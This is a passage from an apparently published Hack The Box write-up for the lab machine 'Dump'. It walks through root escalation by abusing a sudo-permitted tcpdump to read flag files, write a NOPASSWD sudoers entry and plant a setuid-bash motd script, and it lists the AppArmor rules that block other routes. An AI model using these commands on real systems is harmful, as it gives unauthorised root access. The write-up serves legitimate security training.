+fritz <span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> NOPASSWD: ALL
+</code></pre></div></div>
+<p>I’ve intentionally left some blank lines at the top to give separation from the PCAP header. Now I’ll start a capture listening on a specific UDP port:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-w</span> sudoers.pcap <span class="nt">-c10</span> <span class="nt">-i</span> lo <span class="nt">-A</span> udp port 9001 
+<span class="go">tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+</span></code></pre></div></div>
+<p>In another terminal, I’ll send the <code class="language-plaintext highlighter-rouge">sudoers</code> file to that port:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>sudoers | nc <span class="nt">-u</span> 127.0.0.1 9001
+</code></pre></div></div>
+<p>I’ll using UDP so it works without having anything listening to receive it, but I could just as easily use TCP as long as I open a <code class="language-plaintext highlighter-rouge">nc</code> listening to catch the incoming connection (or else it will fail in the three way handshake before the data is sent and captured).</p>
+<p>Now I’ll CTRL-c the capture and it has the data in a valid PCAP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-w</span> sudoers.pcap <span class="nt">-c10</span> <span class="nt">-i</span> lo <span class="nt">-A</span> udp port 9001 
+<span class="go">tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+^C1 packet captured
+2 packets received by filter
+0 packets dropped by kernel
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>sudoers.pcap 
+<span class="go">p/      iEME?@@j#)+&gt;
+fritz ALL=(ALL:ALL) NOPASSWD: ALL
+</span></code></pre></div></div>
+<p>I’ll get a copy of this PCAP to Dump (base64 encode, copy/paste, decode was easy).</p>
+<p><code class="language-plaintext highlighter-rouge">-r</code> in <code class="language-plaintext highlighter-rouge">tcpdump</code> will read from a file instead of an interface:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> fritz <span class="nt">-r</span> sudoers.pcap <span class="nt">-w</span> /dev/shm/11111111-1111-1111-1111-111111111116 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="go">reading from file sudoers.pcap, link-type EN10MB (Ethernet), snapshot length 262144
+</span><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">cat</span> /dev/shm/11111111-1111-1111-1111-111111111116 
+<span class="go">p/      iEME?@@j#)+&gt;
+fritz ALL=(ALL:ALL) NOPASSWD: ALL
+</span></code></pre></div></div>
+<p>It writes these lines (with some junk at the top) to the output file.</p>
+<h3 id="flag-file-read">Flag File Read</h3>
+<p><code class="language-plaintext highlighter-rouge">-r</code> will allow me to read in a PCAP instead of listening. Trying to read non-PCAP files with this won’t work. But there is also <code class="language-plaintext highlighter-rouge">-V [file]</code>:</p>
+<blockquote>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   -V file
+          Read a list of filenames from file. Standard input is used if file is ``-''.
+</code></pre></div> </div>
+</blockquote>
+<p>I can read arbitrary files using this, including the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-V</span> /root/root.txt <span class="nt">-w</span> /tmp/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa            
+<span class="go">/etc/sudoers.d/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1:37: syntax error
+                                    ^
+tcpdump: 84406779************************: No such file or directory
+</span></code></pre></div></div>
+<p>The error leaks the flag.</p>
+<h3 id="escalation-via-sudoers">Escalation via sudoers</h3>
+<p>I’ll use the write file primitive above to write a <code class="language-plaintext highlighter-rouge">sudoers</code> file giving rights to fritz. I’ve already got the PCAP with a line containing syntax to allow fritz to run any command as any user without a password. I’ll write it to <code class="language-plaintext highlighter-rouge">/etc/sudoers.d/[GUID]</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/dev/shm$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> root <span class="nt">-r</span> sudoers.pcap <span class="nt">-w</span> /etc/sudoers.d/11111111-1111-1111-1111-111111111116 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="go">reading from file sudoers.pcap, link-type EN10MB (Ethernet), snapshot length 262144
+</span></code></pre></div></div>
+<p>Neither www-data nor fritz can list that directory, but I can test it in a shell as fritz:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">/etc/sudoers.d/11111111-1111-1111-1111-111111111116:1:77: syntax error
+                                                                            ^~~~~~~
+Matching Defaults entries for fritz on dump:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fritz may run the following commands on dump:
+    (ALL : ALL) NOPASSWD: ALL
+</span></code></pre></div></div>
+<p>There’s an error on the first line, but then the next line works great! I can get a shell as root, and the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-i</span>
+<span class="go">/etc/sudoers.d/11111111-1111-1111-1111-111111111116:1:77: syntax error
+                                                                            ^~~~~~~
+root@dump:~# cat root.txt
+d9f5cf8c************************
+</span></code></pre></div></div>
+<h3 id="escalation-via-motd">Escalation via motd</h3>
+<p>I’ll use the primitives above to write a file as fritz to <code class="language-plaintext highlighter-rouge">/etc/update-motd.d/[any GUID]</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> fritz <span class="nt">-w</span> /etc/update-motd.d/dddddddd-dddd-dddd-dddd-dddddddddddd <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="go">
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+20 packets received by filter
+0 packets dropped by kernel
+</span></code></pre></div></div>
+<p>It doesn’t matter what’s in the file, as that is now owned by fritz:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /etc/update-motd.d/
+<span class="go">total 8
+-rwxr-xr-x 1 root  root   23 Apr  4  2017 10-uname
+-rw-r--r-- 1 fritz fritz 892 Nov  2 01:00 dddddddd-dddd-dddd-dddd-dddddddddddd
+</span></code></pre></div></div>
+<p>Because fritz owns the file, I can make it executable and overwrite it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:/etc/update-motd.d$</span><span class="w"> </span><span class="nb">chmod</span> +x dddddddd-dddd-dddd-dddd-dddddddddddd 
+<span class="gp">fritz@dump:/etc/update-motd.d$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/0xdf'</span> | <span class="nb">tee </span>dddddddd-dddd-dddd-dddd-dddddddddddd 
+<span class="c">#!/bin/bash
+</span><span class="go">
+cp /bin/bash /tmp/0xdf
+chmod 6777 /tmp/0xdf
+</span></code></pre></div></div>
+<p>Now I’ll just connect over SSH, where this will be run by root:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'Passw0rdH4shingIsforNoobZ!'</span> ssh fritz@10.129.26.68
+<span class="go">Linux dump 5.10.0-36-cloud-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64
+Last login: Sat Nov  1 03:27:41 2025 from 10.10.14.17
+</span><span class="gp">fritz@dump:~$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="go">0xdf-5.1#
+</span></code></pre></div></div>
+<p>And I can read the flag:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">0xdf-5.1# </span><span class="nb">cat</span> /root/root.txt
+<span class="go">84406779************************
+</span></code></pre></div></div>
+<h3 id="apparmor-failures">Apparmor Failures</h3>
+<p>In <code class="language-plaintext highlighter-rouge">/etc/apparmor.d</code> there is a specific custom rule for <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:/etc/apparmor.d$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">abstractions  disable  force-complain  local  lsb_release  nvidia_modprobe  tunables  usr.bin.man  usr.bin.tcpdump  usr.sbin.chronyd
+</span></code></pre></div></div>
+<p>This rule looks like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># vim:syntax=apparmor</span>
+<span class="c">#include &lt;tunables/global&gt;</span>
+
+profile tcpdump /usr/bin/tcpdump <span class="o">{</span>
+  <span class="c">#include &lt;abstractions/base&gt;</span>
+  <span class="c">#include &lt;abstractions/nameservice&gt;</span>
+  <span class="c">#include &lt;abstractions/user-tmp&gt;</span>
+
+  capability net_raw,
+  capability setuid,
+  capability setgid,
+  capability dac_override,
+  capability <span class="nb">chown</span>,
+  network raw,
+  network packet,
+
+  <span class="c"># for -D</span>
+  @<span class="o">{</span>PROC<span class="o">}</span>/bus/usb/ r,
+  @<span class="o">{</span>PROC<span class="o">}</span>/bus/usb/<span class="k">**</span> r,
+
+  <span class="c"># for finding an interface</span>
+  /dev/ r,
+  @<span class="o">{</span>PROC<span class="o">}</span>/[0-9]<span class="k">*</span>/net/dev r,
+  /sys/bus/usb/devices/ r,
+  /sys/class/net/ r,
+  /sys/devices/<span class="k">**</span>/net/<span class="k">**</span> r,
+
+  <span class="c"># for -j</span>
+  capability net_admin,
+
+  <span class="c"># for tracing USB bus, which libpcap supports</span>
+  /dev/usbmon<span class="k">*</span> r,
+  /dev/bus/usb/ r,
+  /dev/bus/usb/<span class="k">**</span> r,
+
+  <span class="c"># for init_etherarray(), with -e</span>
+  /etc/ethers r,
+
+  <span class="c"># for USB probing (see libpcap-1.1.x/pcap-usb-linux.c:probe_devices())</span>
+  /dev/bus/usb/<span class="k">**</span>/[0-9]<span class="k">*</span> w,
+
+  <span class="c"># for -z</span>
+  /<span class="o">{</span>usr/,<span class="o">}</span>bin/gzip ixr,
+  /<span class="o">{</span>usr/,<span class="o">}</span>bin/bzip2 ixr,
+
+  <span class="c"># for -F and -w</span>
+  audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span> mrwkl,
+  audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span>/ rw,
+  audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span>/<span class="k">**</span> mrwkl,
+  audit deny @<span class="o">{</span>HOME<span class="o">}</span>/bin/ rw,
+  audit deny @<span class="o">{</span>HOME<span class="o">}</span>/bin/<span class="k">**</span> mrwkl,
+  owner @<span class="o">{</span>HOME<span class="o">}</span>/ r,
+  owner @<span class="o">{</span>HOME<span class="o">}</span>/<span class="k">**</span> rw,
+
+  <span class="c"># for -r, -F and -w</span>
+  /<span class="k">**</span>.[pP][cC][aA][pP] rw,
+  /<span class="k">**</span>.[cC][aA][pP] rw,
+  <span class="c"># -W adds a numerical suffix</span>
+  /<span class="k">**</span>.[pP][cC][aA][pP][0-9]<span class="k">*</span> rw,
+  /<span class="k">**</span>.[cC][aA][pP][0-9]<span class="k">*</span> rw,
+
+  <span class="c"># for convenience with -r (ie, read pcap files from other sources)</span>
+  /var/log/snort/<span class="k">*</span>log<span class="k">*</span> r,
+
+  /usr/bin/tcpdump mr,
+
+  <span class="c"># Site-specific additions and overrides. See local/README for details.</span>
+  <span class="c">#include &lt;local/usr.bin.tcpdump&gt;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>This configuration blocks several escalation methods. This part blocks writing to writing hidden files and directories in the current user’s home directory (which is root when running as root):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span> mrwkl,        <span class="c"># Denies hidden files in HOME</span>
+audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span>/ rw,          <span class="c"># Denies hidden directories</span>
+audit deny @<span class="o">{</span>HOME<span class="o">}</span>/.<span class="k">*</span>/<span class="k">**</span> mrwkl,     <span class="c"># Denies files inside hidden dirs</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">-z</code> flag allows specifying the command to run to compress, which typically would allow me to run arbitrary commands. However, this section of the AppArmor config blocks that:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/<span class="o">{</span>usr/,<span class="o">}</span>bin/gzip ixr,
+/<span class="o">{</span>usr/,<span class="o">}</span>bin/bzip2 ixr,
+</code></pre></div></div>
+<p>Only <code class="language-plaintext highlighter-rouge">gzip</code> and <code class="language-plaintext highlighter-rouge">bzip2</code> can be run here.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/11/04/htb-dump.html"></a>
+</article>
